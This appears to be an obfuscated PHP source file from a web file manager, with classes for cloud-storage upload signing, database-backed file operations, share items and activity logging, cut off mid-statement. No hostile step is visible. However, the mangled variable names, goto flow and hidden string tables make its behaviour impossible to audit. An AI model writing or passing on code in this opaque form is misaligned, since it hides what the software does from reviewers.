<?php
 goto cÉŒÎêå­õ; B‹ùÅœÓôß: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($œîø¤ò) { parent::__construct($œîø¤ò); $this->signatureVersion($_SERVER[…É¦À–][216]); } public function uploadFormData($‰¨Ÿã‹‹, $•òò = 3600) { $¥Å”µ—è =& $_SERVER[…É¦À–]; $ÌÎÃò·ï = $¥Å”µ—è[199]; $ùì¼Åœã = $¥Å”µ—è[232]; $‰ü¢·ğÚ = $¥Å”µ—è[242]; $ï‹‡î–¨ = gmdate($¥Å”µ—è[1370], time() + $•òò); $Ê™•”ÛØ = (string) time() . $¥Å”µ—è[71] . (string) (time() + $•òò); $´ùğ¶ø = array($¥Å”µ—è[243] => $ï‹‡î–¨, $¥Å”µ—è[246] => array(array($¥Å”µ—è[248] => $ÌÎÃò·ï), array($¥Å”µ—è[247] => $this->bucket), array($¥Å”µ—è[249], $¥Å”µ—è[250], $¥Å”µ—è[12]), array($¥Å”µ—è[253] => $‰ü¢·ğÚ), array($¥Å”µ—è[1371] => $ùì¼Åœã), array($¥Å”µ—è[1372] => $this->accessKey), array($¥Å”µ—è[1373] => $Ê™•”ÛØ))); $´ùğ¶ø = json_encode($´ùğ¶ø); $¶¢Ó‚şô = hash_hmac($¥Å”µ—è[232], $Ê™•”ÛØ, $this->secret); $êÌ‚¢ô® = sha1($´ùğ¶ø); $—¢·Õê¡ = hash_hmac($¥Å”µ—è[232], $êÌ‚¢ô®, $¶¢Ó‚şô); $ô²çÄÜ½ = array($¥Å”µ—è[248] => $ÌÎÃò·ï, $¥Å”µ—è[253] => $‰ü¢·ğÚ, $¥Å”µ—è[261] => base64_encode($´ùğ¶ø), $¥Å”µ—è[1371] => $ùì¼Åœã, $¥Å”µ—è[1372] => $this->accessKey, $¥Å”µ—è[1374] => $Ê™•”ÛØ, $¥Å”µ—è[1375] => $—¢·Õê¡, $¥Å”µ—è[182] => $this->getHost()); return $ô²çÄÜ½; } public function fileOutLink($²äŠ¦”¤) { $Î©³ÊÔÈ =& $_SERVER[…É¦À–]; if (substr($²äŠ¦”¤, 0, 7) == $Î©³ÊÔÈ[1376]) { $²äŠ¦”¤ = $Î©³ÊÔÈ[1377] . substr($²äŠ¦”¤, 7); } header($Î©³ÊÔÈ[161] . $²äŠ¦”¤); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($˜îè÷Û´) { $this->pathParse = $˜îè÷Û´; $this->model = Model($_SERVER[…É¦À–][1378]); } public function getPath($èÍ“”Ş) { return trim($èÍ“”Ş, $_SERVER[…É¦À–][8]); } public function pathFather($Åó—Âîû) { $Õ‹àú•‰ = $this->parse($Åó—Âîû); $Õ‹àú•‰ = $this->infoSimple($Åó—Âîû); return $Õ‹àú•‰ ? $Õ‹àú•‰[$_SERVER[…É¦À–][461]] : !1; } public function pathThis($ƒ²÷ÇÃ–) { $ú»±æøò = $this->infoSimple($ƒ²÷ÇÃ–); return $ú»±æøò ? $ú»±æøò[$_SERVER[…É¦À–][32]] : !1; } public function getPathOuter($õ‚Ïêò) { if (!$õ‚Ïêò) { return $õ‚Ïêò; } $ŠÑïÓÁ = $this->parse($õ‚Ïêò); return KodIO::make($ŠÑïÓÁ[$_SERVER[…É¦À–][428]]); } public function copyFolderFromIO($õª”¨ †, $’âøù¥Â, $ìèú´ŸĞ, $¤×£‚£¥, $õöÈÀåÓ) { $ô»ÑüÆ¡ = $this->model->copyFolderFromIO($õª”¨ †, $’âøù¥Â, $ìèú´ŸĞ, $¤×£‚£¥, $õöÈÀåÓ); return KodIO::make($ô»ÑüÆ¡); } public function isParentOf($ãÀÑ•ºí, $ÈºÓëş¼) { return $this->model->isParentOf($ãÀÑ•ºí, $ÈºÓëş¼); } public function mkfile($‚Ïõ²¸Œ, $óëÃ¸ É = '', $ÖÑšµø¸ = REPEAT_RENAME) { $İ€¸õ­£ =& $_SERVER[…É¦À–]; $¸‚àÙÛ = $this->parse($‚Ïõ²¸Œ); $‚Ïõ²¸Œ = $¸‚àÙÛ[$İ€¸õ­£[428]]; for ($ó€úÈ–È = 0; $ó€úÈ–È < count($¸‚àÙÛ[$İ€¸õ­£[1379]]); $ó€úÈ–È++) { $ëº…¡„ä = $¸‚àÙÛ[$İ€¸õ­£[1379]][$ó€úÈ–È]; if ($ó€úÈ–È == count($¸‚àÙÛ[$İ€¸õ­£[1379]]) - 1) { $‚Ïõ²¸Œ = $this->model->mkfile($‚Ïõ²¸Œ, $ëº…¡„ä, $óëÃ¸ É, $ÖÑšµø¸); break; } $‚Ïõ²¸Œ = $this->model->mkdir($‚Ïõ²¸Œ, $ëº…¡„ä, REPEAT_SKIP); } return $this->getPathOuter($‚Ïõ²¸Œ); } public function mkdir($ç´‘¼àí, $ô ¹£éƒ = REPEAT_SKIP) { $ı©¥ğô¹ =& $_SERVER[…É¦À–]; $Æ·¤¨í = $this->parse($ç´‘¼àí); $ç´‘¼àí = $Æ·¤¨í[$ı©¥ğô¹[428]]; for ($Èóœí¿½ = 0; $Èóœí¿½ < count($Æ·¤¨í[$ı©¥ğô¹[1379]]); $Èóœí¿½++) { $®¾çêüó = $Æ·¤¨í[$ı©¥ğô¹[1379]][$Èóœí¿½]; $ç´‘¼àí = $this->model->mkdir($ç´‘¼àí, $®¾çêüó, $ô ¹£éƒ); } return $this->getPathOuter($ç´‘¼àí); } public function copyFile($—€ª”æ³, $İÙ–ûÇŸ, $²¸ıÅ¦ï = REPEAT_REPLACE) { $Áøˆ³‹ö =& $_SERVER[…É¦À–]; $–È¦Ò = $this->parse($İÙ–ûÇŸ); $¨ÔşÛ³Ø = $this->model->copy($—€ª”æ³, $–È¦Ò[$Áøˆ³‹ö[428]], $²¸ıÅ¦ï, $–È¦Ò[$Áøˆ³‹ö[84]]); return $¨ÔşÛ³Ø ? $this->getPathOuter($¨ÔşÛ³Ø) : !1; } public function moveFile($ îú„Àƒ, $æÄÏéïÃ, $Â©Ä¤›¤ = REPEAT_REPLACE) { $ğÊÛäÉ¦ =& $_SERVER[…É¦À–]; $Ë›¯Ëğ„ = $this->parse($æÄÏéïÃ); $Å¨ïÃœ‹ = $this->model->move($ îú„Àƒ, $Ë›¯Ëğ„[$ğÊÛäÉ¦[428]], $Â©Ä¤›¤, $Ë›¯Ëğ„[$ğÊÛäÉ¦[84]]); return $Å¨ïÃœ‹ ? $this->getPathOuter($Å¨ïÃœ‹) : !1; } public function copy($Ç¬Ï¡ù, $ü¶€ÃÂô, $‰Ìµé¹¼ = REPEAT_REPLACE, $«ŸáÄÖ¥ = false) { $“àã†Ñ© = $this->parse($ü¶€ÃÂô); $œïŒÎÁ§ = $this->model->copy($Ç¬Ï¡ù, $“àã†Ñ©[$_SERVER[…É¦À–][428]], $‰Ìµé¹¼, $«ŸáÄÖ¥); return $œïŒÎÁ§ ? $this->getPathOuter($œïŒÎÁ§) : !1; } public function moveSameAllow() { } public function move($„ºğµ˜÷, $ä¾ø†ê, $á¾÷Øé× = REPEAT_REPLACE, $¥ ğÏš = false) { $áÆœ£˜¹ = $this->parse($ä¾ø†ê); $¿¸½Ã±ü = $this->model->move($„ºğµ˜÷, $áÆœ£˜¹[$_SERVER[…É¦À–][428]], $á¾÷Øé×, $¥ ğÏš); return $¿¸½Ã±ü ? $this->getPathOuter($¿¸½Ã±ü) : !1; } public function remove($¼ÌÒèÈú, $êÌ„Ş‰½ = true) { return $this->model->remove($¼ÌÒèÈú, $êÌ„Ş‰½); } public function rename($´ÖêÚç¶, $É¿ÛúÔç) { $³ò’éû¾ = $this->model->rename($´ÖêÚç¶, $É¿ÛúÔç); return $³ò’éû¾ ? $this->getPathOuter($´ÖêÚç¶) : $³ò’éû¾; } public function size($é²¶ğñÒ) { $òßáéÇĞ = $this->infoSimple($é²¶ğñÒ); return $òßáéÇĞ ? $òßáéÇĞ[$_SERVER[…É¦À–][76]] : 0; } public function infoSimple($º¡ñ“İÉ) { return $this->model->sourceInfo($º¡ñ“İÉ); } public function info($Ö¶™¹ÎÁ) { return $this->infoParse($Ö¶™¹ÎÁ); } public function infoAuth($ş¥Äç×¯) { return $this->infoParse($ş¥Äç×¯, !1, !0); } public function infoWithChildren($ŠıëğöÌ) { return $this->infoParse($ŠıëğöÌ, !0); } protected function infoParse($·öŒÈÓÙ, $Æ»¦úœŒ = false, $ õíñ»Å = false) { if (!$Æ»¦úœŒ) { return $this->model->pathInfo($·öŒÈÓÙ, $ õíñ»Å); } return $this->model->pathInfoMore($·öŒÈÓÙ); } public function infoFull($åüÜØ) { $åƒÚä“§ =& $_SERVER[…É¦À–]; $ä–Îê­» = explode($åƒÚä“§[8], $åüÜØ); $Ùİ€õñ = implode($åƒÚä“§[8], array_splice($ä–Îê­», 1)); return $this->model->pathInfoByPath($ä–Îê­»[0], $Ùİ€õñ); } public function hashSimple($ÂàÑ…Œ) { $êØøÛù =& $_SERVER[…É¦À–]; $İñ²û¸‡ = $this->infoWithChildren($ÂàÑ…Œ); return $İñ²û¸‡[$êØøÛù[170]][$êØøÛù[177]]; } public function hashMd5($¸¥ÎõŒó) { $¥È¸ñÂ =& $_SERVER[…É¦À–]; $‡ë™½Æã = $this->infoWithChildren($¸¥ÎõŒó); return $‡ë™½Æã[$¥È¸ñÂ[170]][$¥È¸ñÂ[176]]; } public function exist($âÎÌ½£—) { $çÁ´Âú¸ =& $_SERVER[…É¦À–]; $õ“ì²ã = $this->parse($âÎÌ½£—); if (!$õ“ì²ã[$çÁ´Âú¸[84]]) { return $this->isFile($âÎÌ½£—) || $this->isFolder($âÎÌ½£—); } $åçÇğºÍ = array($çÁ´Âú¸[430] => $õ“ì²ã[$çÁ´Âú¸[428]], $çÁ´Âú¸[32] => $õ“ì²ã[$çÁ´Âú¸[84]]); $ì¸²·µˆ = $this->model->where($åçÇğºÍ)->find(); return $ì¸²·µˆ ? !0 : !1; } public function isFile($¢¡·¼øš) { $¤ÜàÒñµ =& $_SERVER[…É¦À–]; $§×å Ü = $this->infoSimple($¢¡·¼øš); return $§×å Ü && $§×å Ü[$¤ÜàÒñµ[439]] == $¤ÜàÒñµ[88] ? !1 : !0; } public function isFolder($­İØë—ï) { $³Î²Æº =& $_SERVER[…É¦À–]; $ıß»¹çÇ = $this->infoSimple($­İØë—ï); return $ıß»¹çÇ && $ıß»¹çÇ[$³Î²Æº[439]] == $³Î²Æº[88] ? !0 : !1; } public function listPath($¯»Œ§º, $Û’‚®°à = false) { $·ÈŞŒÌ• =& $_SERVER[…É¦À–]; if ($¯»Œ§º == $·ÈŞŒÌ•[12]) { return !1; } $†ËÏß½œ = array($·ÈŞŒÌ•[430] => $¯»Œ§º); if ($Û’‚®°à) { return $this->model->listSource($†ËÏß½œ, -1); } return $this->model->listSource($†ËÏß½œ); } public function has($±®õÇã•, $ó³¤Ù®ˆ = false, $†Ğİ…Ù¾ = null) { $“âé—Å =& $_SERVER[…É¦À–]; $Ò¶ÕÙ°ş = $this->infoWithChildren($±®õÇã•); if ($ó³¤Ù®ˆ) { return array($“âé—Å[208] => $Ò¶ÕÙ°ş[$“âé—Å[208]], $“âé—Å[207] => $Ò¶ÕÙ°ş[$“âé—Å[207]]); } return $†Ğİ…Ù¾ ? $Ò¶ÕÙ°ş[$“âé—Å[208]] : $Ò¶ÕÙ°ş[$“âé—Å[207]]; } public function listAll($³ÊË®Íª) { $ç²¼æ‚ = IO::info($this->pathParse[$_SERVER[…É¦À–][84]]); if (!$ç²¼æ‚) { return array(); } return $this->model->listAll($³ÊË®Íª); } public function getContent($æ¬ÜˆËØ) { return $this->model->getContent($æ¬ÜˆËØ); } public function setContent($Ê¿ùúµœ, $´±±êúù = '') { return $this->model->setContent($Ê¿ùúµœ, $´±±êúù); } public function fileSubstr($ÜËèçˆå, $×™ïšÎó, $Úç‹øÄĞ) { return $this->model->fileSubstr($ÜËèçˆå, $×™ïšÎó, $Úç‹øÄĞ); } public function download($€Â²ãÈé, $¡Æ©¹Ü = '') { $êµƒ‘Š = get_path_father($¡Æ©¹Ü); $Èú¤Ä­™ = get_path_this($¡Æ©¹Ü); $¾ãå½§ü = $this->model->fileInfoGet($€Â²ãÈé); $–İŒŒŒÓ = IO::copy($¾ãå½§ü[$_SERVER[…É¦À–][84]], $êµƒ‘Š, !1, $Èú¤Ä­™); return $–İŒŒŒÓ; } public function setModifyTime($íßÅµúÀ, $÷¡¸»™ = '') { $Àäñ =& $_SERVER[…É¦À–]; if (!$íßÅµúÀ) { return; } $this->model->where(array($Àäñ[446] => $íßÅµúÀ))->save(array($Àäñ[85] => $÷¡¸»™)); } public function upload($€â¬îñŒ, $Şñï€, $„éÏ®’Î = false, $İê±ö‰µ = REPEAT_REPLACE) { $ûÅ½àóŸ =& $_SERVER[…É¦À–]; $Á× éÇ¡ = $this->parse($€â¬îñŒ); $©¸ãˆ‘è = $this->model->addFile($Á× éÇ¡[$ûÅ½àóŸ[428]], $Şñï€, $Á× éÇ¡[$ûÅ½àóŸ[84]], $„éÏ®’Î, $İê±ö‰µ); return $this->getPathOuter($©¸ãˆ‘è); } public function uploadFileByID($®¡ÕØš®, $ÍˆúçÈÌ, $ñÕË“ ‡) { $ĞÈƒ¦ë =& $_SERVER[…É¦À–]; $»ı¼àíà = $this->parse($®¡ÕØš®); $òÕíÙ = $this->model->addFileByFileID($»ı¼àíà[$ĞÈƒ¦ë[428]], $ÍˆúçÈÌ, $»ı¼àíà[$ĞÈƒ¦ë[84]], $ñÕË“ ‡); return $this->getPathOuter($òÕíÙ); } public function addFileByRemote($”ìêãœ, $·ƒË­“, $œÄÁá¾î = array(), $º¬‚ô¼ò = '', $¿ıõô€‰) { $‰šŞæßÂ =& $_SERVER[…É¦À–]; $¥‡äÆÒÈ = $this->parse($”ìêãœ); $º¬‚ô¼ò = empty($º¬‚ô¼ò) ? $¥‡äÆÒÈ[$‰šŞæßÂ[84]] : $º¬‚ô¼ò; $ÏïÒªÒÀ = $this->model->addFileByRemote($¥‡äÆÒÈ[$‰šŞæßÂ[428]], $·ƒË­“, $º¬‚ô¼ò, $œÄÁá¾î, $¿ıõô€‰); return $this->getPathOuter($ÏïÒªÒÀ); } public function uploadLink($ËÁùÂú˜, $¸û­ï“ö = 0) { $µè¸­°‘ =& $_SERVER[…É¦À–]; $ª¸äÆ×Å = $this->parse($ËÁùÂú˜); $Î‡Éë•ó = _get($GLOBALS[$µè¸­°‘[7]], $µè¸­°‘[1380]); $µèúšÒš = _get($GLOBALS[$µè¸­°‘[7]], $µè¸­°‘[1381]); $ËÁùÂú˜ = Model($µè¸­°‘[630])->createFileName($ª¸äÆ×Å[$µè¸­°‘[84]], $Î‡Éë•ó, $µèúšÒš); return IO::uploadLink($ËÁùÂú˜, $¸û­ï“ö); } public function fileNameAuto($Ê´˜¥üú, $Û½¾âñ, $§Ë¡ëˆ¬ = REPEAT_REPLACE, $€ğñÃïô = false) { return $this->model->fileNameAuto($Ê´˜¥üú, $Û½¾âñ, $§Ë¡ëˆ¬, $€ğñÃïô); } public function fileNameExist($‰¶»ßÇ¾, $ŠªŠ¢Ç) { return $this->model->fileNameExist($‰¶»ßÇ¾, $ŠªŠ¢Ç); } protected function _fileOut($æ¯¢ÁÍø, $‹’À®ØÇ = false, $¡ö‹¡í– = false, $“ÇÕ›²Í = '', $ñ ³º˜ = false) { $´—‹àõ¿ =& $_SERVER[…É¦À–]; $¹¯Å¡ˆù = $this->model->sourceInfo($æ¯¢ÁÍø); if ($¹¯Å¡ˆù[$´—‹àõ¿[439]] == $´—‹àõ¿[88]) { header($´—‹àõ¿[1382]); die; } $¦Èí¯€Ò = $this->model->fileInfoGet($æ¯¢ÁÍø); $“ÇÕ›²Í = $¦Èí¯€Ò[$´—‹àõ¿[176]] ? $¦Èí¯€Ò[$´—‹àõ¿[176]] : $“ÇÕ›²Í; $æ‘Ñˆ» = isset($GLOBALS[$´—‹àõ¿[1383]]) ? $GLOBALS[$´—‹àõ¿[1383]] : $¹¯Å¡ˆù[$´—‹àõ¿[32]]; if ($ñ ³º˜) { return IO::fileOutServer($¦Èí¯€Ò[$´—‹àõ¿[84]], $‹’À®ØÇ, $æ‘Ñˆ», $“ÇÕ›²Í); } IO::fileOut($¦Èí¯€Ò[$´—‹àõ¿[84]], $‹’À®ØÇ, $æ‘Ñˆ», $“ÇÕ›²Í); } public function fileOut($áêã¼ÖÂ, $ËĞ¸ = false, $ëìØÊùÄ = false, $¸®´šâ· = '') { $this->_fileOut($áêã¼ÖÂ, $ËĞ¸, $ëìØÊùÄ, $¸®´šâ·); } public function fileOutServer($¨­À±ò´, $ôˆÈ¨¦ = false, $”€êà¯ = false, $•ıı½èÍ = '') { $this->_fileOut($¨­À±ò´, $ôˆÈ¨¦, $”€êà¯, $•ıı½èÍ, !0); } protected function _fileOutImage($ìú¹š¯, $†µ‹áù = 250) { $½³‡®Ô =& $_SERVER[…É¦À–]; $¤şì“Ğñ = $this->model->pathInfo($ìú¹š¯); if ($¤şì“Ğñ[$½³‡®Ô[439]] == $½³‡®Ô[88]) { show_json($½³‡®Ô[1384] . $ìú¹š¯, !1); } $œÏ””ıˆ = $this->model->fileInfoGet($ìú¹š¯); $œÏ””ıˆ[$½³‡®Ô[32]] = $¤şì“Ğñ[$½³‡®Ô[32]]; $œÏ””ıˆ[$½³‡®Ô[169]] = $¤şì“Ğñ[$½³‡®Ô[169]]; $GLOBALS[$½³‡®Ô[1383]] = $œÏ””ıˆ[$½³‡®Ô[32]]; $GLOBALS[$½³‡®Ô[168]] = $œÏ””ıˆ; IO::fileOutImage($œÏ””ıˆ[$½³‡®Ô[84]], $†µ‹áù); } public function fileOutImage($‘…ÆµòÊ, $û¥òª¢¥ = 250) { $this->_fileOutImage($‘…ÆµòÊ, $û¥òª¢¥); } public function fileOutImageServer($ˆŒà²İ, $â‘‚÷³« = 250) { $this->_fileOutImage($ˆŒà²İ, $â‘‚÷³«); } public function link($Ú¨êîëÌ, $˜€î¸íÀ = '') { $ë©â¤®‚ = $this->model->fileInfoGet($Ú¨êîëÌ); return IO::link($ë©â¤®‚[$_SERVER[…É¦À–][84]], $˜€î¸íÀ); } protected function parse($¶£Õ¼ªÏ) { $¥‚ùÌŞÛ =& $_SERVER[…É¦À–]; if (strstr($¶£Õ¼ªÏ, $¥‚ùÌŞÛ[8]) === !1) { return array($¥‚ùÌŞÛ[448] => intval($¶£Õ¼ªÏ), $¥‚ùÌŞÛ[84] => $¥‚ùÌŞÛ[12], $¥‚ùÌŞÛ[1379] => array()); } $ÀÊğĞû = explode($¥‚ùÌŞÛ[8], trim($¶£Õ¼ªÏ, $¥‚ùÌŞÛ[8])); if (count($ÀÊğĞû) < 2) { show_tips(clear_html($¶£Õ¼ªÏ) . $¥‚ùÌŞÛ[1385]); } return array($¥‚ùÌŞÛ[448] => intval($ÀÊğĞû[0]), $¥‚ùÌŞÛ[84] => $ÀÊğĞû[1], $¥‚ùÌŞÛ[1379] => array_slice($ÀÊğĞû, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($·ÓÙØ¿§) { $this->pathParse = $·ÓÙØ¿§; $this->model = Model($_SERVER[…É¦À–][1378]); } public function getPathOuter($¶ÇÛÎÌô) { $Ì ¡¼‚² =& $_SERVER[…É¦À–]; if (!$¶ÇÛÎÌô) { return $¶ÇÛÎÌô; } $°£ù‘Ñã = $this->parse($¶ÇÛÎÌô); return trim(KodIO::makeShare($this->pathParse[$Ì ¡¼‚²[428]], $°£ù‘Ñã[$Ì ¡¼‚²[428]]), $Ì ¡¼‚²[8]); } protected function infoParse($ğé¿Ã„¤, $Œ¿¯€ª‡ = false, $ãšèëÆ = false) { $âÃğáÖµ =& $_SERVER[…É¦À–]; $¿±’æÚÑ = $this->pathParse[$âÃğáÖµ[428]]; $È¢òÁè = trim($this->pathParse[$âÃğáÖµ[1213]], $âÃğáÖµ[8]); return Action($âÃğáÖµ[1386])->sharePathInfo($¿±’æÚÑ, $È¢òÁè, $Œ¿¯€ª‡); } public function infoFull($×¦Ä•Ş­) { $óñ¥¦ığ =& $_SERVER[…É¦À–]; $û¶Ãñ©Ä = explode($óñ¥¦ığ[8], trim($×¦Ä•Ş­, $óñ¥¦ığ[8])); if (count($û¶Ãñ©Ä) > 1) { $Ñ‹ÁÔğò = implode($óñ¥¦ığ[8], array_splice($û¶Ãñ©Ä, 1)); $–¶¾ùÌû = $this->model->pathInfoByPath($û¶Ãñ©Ä[0], $Ñ‹ÁÔğò); if (!$–¶¾ùÌû) { return !1; } $this->pathParse[$óñ¥¦ığ[1213]] = $–¶¾ùÌû[$óñ¥¦ığ[431]]; } return $this->infoParse($×¦Ä•Ş­); } public function listAll($Ú²¤ŸÍ£) { $Â¦‡Ÿœ =& $_SERVER[…É¦À–]; $®Ÿ—«ßÅ = IO::info($this->pathParse[$Â¦‡Ÿœ[84]]); if (!$®Ÿ—«ßÅ) { return array(); } $ÆÃşÂ©¦ = $this->model->listAll($Ú²¤ŸÍ£); $¾¢à¹×³ = Model($Â¦‡Ÿœ[621])->getInfo($®Ÿ—«ßÅ[$Â¦‡Ÿœ[622]]); foreach ($ÆÃşÂ©¦ as &$¸¤©²Ìˆ) { check_abort(); $¸¤©²Ìˆ[$Â¦‡Ÿœ[87]] = Action($Â¦‡Ÿœ[1386])->_shareItemeParse($¸¤©²Ìˆ[$Â¦‡Ÿœ[87]], $¾¢à¹×³); } unset($¸¤©²Ìˆ); return $ÆÃşÂ©¦; } } goto eôÎ²íø¶²; a©è®çˆ¶„: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\x4c\x69\147\150\164\101\160\x70"; public $modelType = "\x53\171\x73\164\x65\x6d\117\160\164\x69\x6f\x6e"; public $field = array("\x6e\x61\155\x65", "\147\162\x6f\x75\x70", "\144\x65\x73\x63", "\143\157\x6e\164\145\x6e\164"); public function listData($Õßº‚©¸ = false, $¸ÃÊáøë = "\x6d\x6f\144\151\x66\171\x54\x69\x6d\145", $×‘ÊÆê = true) { return parent::listData($Õßº‚©¸, $¸ÃÊáøë, $×‘ÊÆê); } public function remove($£ÔÖÏğˆ) { $™İÊÙŠ = $this->findByName($£ÔÖÏğˆ); if (!$™İÊÙŠ) { return !1; } return parent::remove($™İÊÙŠ[$_SERVER[…É¦À–][428]]); } public function add($¿Ó†Æœü) { if ($this->findByName($¿Ó†Æœü[$_SERVER[…É¦À–][32]])) { return !1; } return parent::insert($¿Ó†Æœü); } public function update($Õèï²˜, $µ…•œÁ”) { $ÒÍÊŞã¥ =& $_SERVER[…É¦À–]; $âæšò° = $this->findByName($Õèï²˜); $êš±¶éÙ = $this->findByName($µ…•œÁ”[$ÒÍÊŞã¥[32]]); if (!$âæšò° || $êš±¶éÙ && $êš±¶éÙ[$ÒÍÊŞã¥[428]] != $âæšò°[$ÒÍÊŞã¥[428]]) { return !1; } return parent::update($âæšò°[$ÒÍÊŞã¥[428]], $µ…•œÁ”); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\155\x5f\154\157\147"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\x54\x69\x6d\x65", "\x74\x69\x6d\145", "\151\x6e\x73\x65\x72\x74", "\146\x75\x6e\x63\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ª»—ÁÚ =& $_SERVER[…É¦À–]; return array($ª»—ÁÚ[2210] => LNG($ª»—ÁÚ[2211]), $ª»—ÁÚ[2212] => LNG($ª»—ÁÚ[2213]), $ª»—ÁÚ[1820] => LNG($ª»—ÁÚ[2214]), $ª»—ÁÚ[2215] => LNG($ª»—ÁÚ[2216]), $ª»—ÁÚ[2217] => LNG($ª»—ÁÚ[2218]), $ª»—ÁÚ[2219] => LNG($ª»—ÁÚ[2220]), $ª»—ÁÚ[2221] => LNG($ª»—ÁÚ[2222]), $ª»—ÁÚ[1850] => LNG($ª»—ÁÚ[2222]), $ª»—ÁÚ[1851] => LNG($ª»—ÁÚ[2223]), $ª»—ÁÚ[2224] => LNG($ª»—ÁÚ[2225]), $ª»—ÁÚ[2226] => LNG($ª»—ÁÚ[2227]), $ª»—ÁÚ[2228] => LNG($ª»—ÁÚ[2229]), $ª»—ÁÚ[2230] => LNG($ª»—ÁÚ[2231]), $ª»—ÁÚ[1848] => LNG($ª»—ÁÚ[2232]), $ª»—ÁÚ[2233] => LNG($ª»—ÁÚ[2234]), $ª»—ÁÚ[1855] => LNG($ª»—ÁÚ[2235]), $ª»—ÁÚ[2236] => LNG($ª»—ÁÚ[2237]), $ª»—ÁÚ[2238] => LNG($ª»—ÁÚ[2239]), $ª»—ÁÚ[2240] => LNG($ª»—ÁÚ[2241]), $ª»—ÁÚ[2242] => LNG($ª»—ÁÚ[2243]), $ª»—ÁÚ[1858] => LNG($ª»—ÁÚ[2244]), $ª»—ÁÚ[1859] => LNG($ª»—ÁÚ[2245]), $ª»—ÁÚ[2246] => LNG($ª»—ÁÚ[2247]), $ª»—ÁÚ[2248] => LNG($ª»—ÁÚ[2249]), $ª»—ÁÚ[2250] => LNG($ª»—ÁÚ[2251]), $ª»—ÁÚ[1853] => LNG($ª»—ÁÚ[2252]), $ª»—ÁÚ[2253] => LNG($ª»—ÁÚ[2254]), $ª»—ÁÚ[1852] => LNG($ª»—ÁÚ[2255]), $ª»—ÁÚ[2256] => LNG($ª»—ÁÚ[2257]), $ª»—ÁÚ[2258] => LNG($ª»—ÁÚ[2259]), $ª»—ÁÚ[2260] => LNG($ª»—ÁÚ[2261]), $ª»—ÁÚ[2262] => LNG($ª»—ÁÚ[2262]), $ª»—ÁÚ[2263] => LNG($ª»—ÁÚ[1824]), $ª»—ÁÚ[2264] => LNG($ª»—ÁÚ[2265]), $ª»—ÁÚ[2266] => LNG($ª»—ÁÚ[2267]), $ª»—ÁÚ[2268] => LNG($ª»—ÁÚ[2269]), $ª»—ÁÚ[2270] => LNG($ª»—ÁÚ[2271]), $ª»—ÁÚ[2272] => LNG($ª»—ÁÚ[2273]), $ª»—ÁÚ[2274] => LNG($ª»—ÁÚ[2274]), $ª»—ÁÚ[2275] => LNG($ª»—ÁÚ[2276]), $ª»—ÁÚ[2277] => LNG($ª»—ÁÚ[2278]), $ª»—ÁÚ[2279] => LNG($ª»—ÁÚ[2280]), $ª»—ÁÚ[2281] => LNG($ª»—ÁÚ[2282]), $ª»—ÁÚ[2283] => LNG($ª»—ÁÚ[2284]), $ª»—ÁÚ[2285] => LNG($ª»—ÁÚ[2286])); } private function typeFile() { $Ï«ŒÓ¥È =& $_SERVER[…É¦À–]; $Şèøù• = array($Ï«ŒÓ¥È[1855] => array($Ï«ŒÓ¥È[1856]), $Ï«ŒÓ¥È[2228] => array($Ï«ŒÓ¥È[2287]), $Ï«ŒÓ¥È[2230] => array($Ï«ŒÓ¥È[2288]), $Ï«ŒÓ¥È[1848] => array($Ï«ŒÓ¥È[1849]), $Ï«ŒÓ¥È[2238] => array(), $Ï«ŒÓ¥È[2240] => array(), $Ï«ŒÓ¥È[2242] => array(), $Ï«ŒÓ¥È[1858] => array($Ï«ŒÓ¥È[1860]), $Ï«ŒÓ¥È[1859] => array($Ï«ŒÓ¥È[1860]), $Ï«ŒÓ¥È[2246] => array($Ï«ŒÓ¥È[2289]), $Ï«ŒÓ¥È[2248] => array($Ï«ŒÓ¥È[2289]), $Ï«ŒÓ¥È[2250] => array($Ï«ŒÓ¥È[2290]), $Ï«ŒÓ¥È[2236] => array($Ï«ŒÓ¥È[2291]), $Ï«ŒÓ¥È[1853] => array($Ï«ŒÓ¥È[2292]), $Ï«ŒÓ¥È[2253] => array($Ï«ŒÓ¥È[2293]), $Ï«ŒÓ¥È[1852] => array($Ï«ŒÓ¥È[1854])); return $Şèøù•; } private function typeAll() { $¢¼ä•­¬ =& $_SERVER[…É¦À–]; $äôäÙ = $this->typeList; $æ®Úäİ = array_filter($this->typeFile()); foreach ($æ®Úäİ as $Ñµİ => $ĞŒ°õ‚Ë) { $äôäÙ[$ĞŒ°õ‚Ë[0]] = $äôäÙ[$Ñµİ]; } $äôäÙ[$¢¼ä•­¬[1860]] = LNG($¢¼ä•­¬[2294]); $äôäÙ[$¢¼ä•­¬[2289]] = LNG($¢¼ä•­¬[2295]); return $äôäÙ; } public function addLog($Ê®Ÿ“Ë¸, $®„¤ô³ü = array()) { $İø˜ÀæÉ =& $_SERVER[…É¦À–]; if (!isset($this->typeList[$Ê®Ÿ“Ë¸])) { return; } $ëªÇí°– = isset($®„¤ô³ü[$İø˜ÀæÉ[1687]]) ? $®„¤ô³ü[$İø˜ÀæÉ[1687]] : 0; if (!$ëªÇí°–) { $ëªÇí°– = Session::get($İø˜ÀæÉ[2014]); } if ($Ê®Ÿ“Ë¸ == $İø˜ÀæÉ[2264] && is_array($®„¤ô³ü[$İø˜ÀæÉ[2296]]) && !$®„¤ô³ü[$İø˜ÀæÉ[2296]]) { return; } $¼åÆûŞ„ = get_client_ip(); if (!$®„¤ô³ü || strlen(json_encode($®„¤ô³ü)) >= 1024) { $®„¤ô³ü = array($İø˜ÀæÉ[2297] => $¼åÆûŞ„); } else { if (is_array($®„¤ô³ü)) { $®„¤ô³ü[$İø˜ÀæÉ[2297]] = $¼åÆûŞ„; } else { $®„¤ô³ü = array($İø˜ÀæÉ[1247] => $®„¤ô³ü, $İø˜ÀæÉ[2297] => $¼åÆûŞ„); } } $®„¤ô³ü = array($İø˜ÀæÉ[1677] => Session::sign(), $İø˜ÀæÉ[1678] => intval($ëªÇí°–), $İø˜ÀæÉ[33] => $Ê®Ÿ“Ë¸, $İø˜ÀæÉ[1680] => json_encode($®„¤ô³ü)); parent::add($®„¤ô³ü); } public function remove($¿Àè†ñ€) { $this->where(array($_SERVER[…É¦À–][448] => 